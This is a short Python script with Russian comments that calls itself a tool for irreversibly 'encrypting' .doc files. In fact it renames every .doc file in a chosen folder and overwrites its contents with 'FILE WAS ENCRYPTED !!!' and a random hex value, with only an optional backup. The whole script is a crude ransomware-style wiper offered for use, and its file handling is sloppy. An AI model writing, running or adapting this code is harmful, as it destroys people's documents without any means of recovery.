#скрипт для шифрования .doc файлов БЕЗ ВОЗМОЖНОСТИ ВОССТАНОВЛЕНИЯ, с предворительным копированием (по выбору)

import random, os ,re ,sys, shutil
path = input('Введите путь к файлам через ДВОЙНЫЕ слэши(\\\): ')
copy_path = input('Хотите создать бэкап файлов(+ \ -): ')
direcroty = os.listdir(path)
numbs = range(1,99999)
t = range(1,25)
x = random.choice(numbs)
print(direcroty)

def main():
	i = 0
	for line in direcroty:
		word_file = line.split('.')[-1]
		print(word_file)
		if word_file == 'doc':
			if i > 0:
				length = os.path.getsize(line)
				ren = os.rename(line,'YOURS_WORD_FILE_' + str(i) + '.txt')
				f = open('YOURS_WORD_FILE_' + str(i) + '.txt', 'w')
				n = 0
				while n != 128:
					f.write("FILE WAS ENCRYPTED !!!\n")
					f.write(str(hex(x)))
					n += 1
				f.close()
			else:
				length = os.path.getsize(line)
				ren = os.rename(line,'YOURS_WORD_FILE.txt')
				f = open('YOURS_WORD_FILE.txt', 'w')
				n = 0
				while n != 128:
					f.write("FILE WAS ENCRYPTED !!!\n")
					f.write(str(hex(x)))
					n += 1
				f.close()

		i += 1

if copy_path == "-":
	main()
elif copy_path == "+":
	j = input("Введите путь для копирвоания через ОДИНАРНЫЕ слэши(\\): ")
	for line in direcroty:
		shutil.copy(line, j)
		print('Копирование файла ' + str(line) + ' завершено!')
	main()
